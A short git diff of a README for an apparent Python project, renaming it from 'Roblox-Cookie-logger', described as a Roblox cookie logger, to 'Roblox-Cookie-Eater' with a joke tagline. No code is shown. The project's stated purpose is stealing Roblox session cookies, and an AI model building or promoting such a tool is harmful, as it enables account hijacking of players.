@@ -1,2 +1,2 @@
-# Roblox-Cookie-logger
-A roblox cookie logger, written in Python. Bye.
+# Roblox-Cookie-Eater
+Cookie Eater!!!!!!! nom!
